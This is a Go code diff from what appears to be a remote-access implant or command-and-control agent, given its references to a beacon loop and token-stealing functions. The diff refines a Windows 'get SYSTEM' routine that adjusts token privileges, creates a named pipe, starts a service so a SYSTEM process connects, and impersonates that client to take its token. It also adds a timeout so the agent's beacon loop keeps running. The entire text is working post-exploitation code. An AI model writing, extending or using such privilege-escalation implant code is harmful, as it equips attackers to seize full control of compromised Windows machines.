@@ -48,6 +48,11 @@ func enablePrivilege(name string) error {
 	if r == 0 {
 		return fmt.Errorf("AdjustTokenPrivileges: %w", e)
 	}
+	// AdjustTokenPrivileges returns TRUE even when not all privs were assigned;
+	// ERROR_NOT_ALL_ASSIGNED (1300) means the privilege isn't in the token.
+	if errno, ok := e.(syscall.Errno); ok && errno == 1300 {
+		return fmt.Errorf("AdjustTokenPrivileges: privilege not held by this token")
+	}
 	return nil
 }
 
@@ -125,24 +130,27 @@ func gsT1TokenSteal() (windows.Token, string, error) {
 
 // gsT2NamedPipeService creates a named pipe + service to get a SYSTEM token.
 // Requires local admin to create a service via SCM.
+// Uses overlapped ConnectNamedPipe with a 15-second timeout to avoid blocking
+// the entire agent beacon loop (tasks run under wg.Wait in beacon.go).
 func gsT2NamedPipeService() (windows.Token, string, error) {
 	pipeName := fmt.Sprintf(`\\.\pipe\svc%08x`, rand.Uint32())
 	pipeNameW, _ := syscall.UTF16PtrFromString(pipeName)
 
 	const (
-		PIPE_ACCESS_DUPLEX       = 0x00000003
-		PIPE_TYPE_BYTE           = 0x00000000
-		PIPE_WAIT                = 0x00000000
-		NMPWAIT_USE_DEFAULT_WAIT = 0x00000000
-		SC_MANAGER_ALL_ACCESS    = 0xF003F
+		PIPE_ACCESS_DUPLEX        = 0x00000003
+		FILE_FLAG_OVERLAPPED      = 0x40000000
+		PIPE_TYPE_BYTE            = 0x00000000
+		PIPE_WAIT                 = 0x00000000
+		NMPWAIT_USE_DEFAULT_WAIT  = 0x00000000
+		SC_MANAGER_ALL_ACCESS     = 0xF003F
 		SERVICE_WIN32_OWN_PROCESS = 0x00000010
-		SERVICE_DEMAND_START     = 0x00000003
-		SERVICE_ERROR_IGNORE     = 0x00000000
+		SERVICE_DEMAND_START      = 0x00000003
+		SERVICE_ERROR_IGNORE      = 0x00000000
 	)
 
 	hPipe, _, e := procCreateNamedPipeW.Call(
 		uintptr(unsafe.Pointer(pipeNameW)),
-		PIPE_ACCESS_DUPLEX,
+		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
 		PIPE_TYPE_BYTE|PIPE_WAIT,
 		1, 512, 512,
 		NMPWAIT_USE_DEFAULT_WAIT,
@@ -183,14 +191,26 @@ func gsT2NamedPipeService() (windows.Token, string, error) {
 		procCloseServiceHandleLat.Call(hSvc)
 	}()
 
+	// Create a manual-reset event for the overlapped ConnectNamedPipe.
+	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
+	if err != nil {
+		return 0, "", fmt.Errorf("T2: CreateEvent: %w", err)
+	}
+	defer windows.CloseHandle(hEvent)
+
+	ov := windows.Overlapped{HEvent: hEvent}
+
 	procStartServiceW.Call(hSvc, 0, 0)
 
-	ret, _, e := procConnectNamedPipe.Call(hPipe, 0)
-	if ret == 0 {
-		errno, _ := e.(syscall.Errno)
-		if errno != 535 { // ERROR_PIPE_CONNECTED is OK
-			return 0, "", fmt.Errorf("T2: ConnectNamedPipe: %w", e)
-		}
+	// Non-blocking ConnectNamedPipe — returns ERROR_IO_PENDING (997) when
+	// the operation is queued; ERROR_PIPE_CONNECTED (535) if already connected.
+	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&ov)))
+
+	// Wait up to 15 seconds for the SYSTEM service process to connect.
+	waitRes, _ := windows.WaitForSingleObject(hEvent, 15000)
+	if waitRes != windows.WAIT_OBJECT_0 {
+		procCancelIoEx.Call(hPipe, uintptr(unsafe.Pointer(&ov)))
+		return 0, "", fmt.Errorf("T2: timeout waiting for pipe connection (res=%d)", waitRes)
 	}
 
 	r, _, e := procImpersonateNamedPipeClient.Call(hPipe)
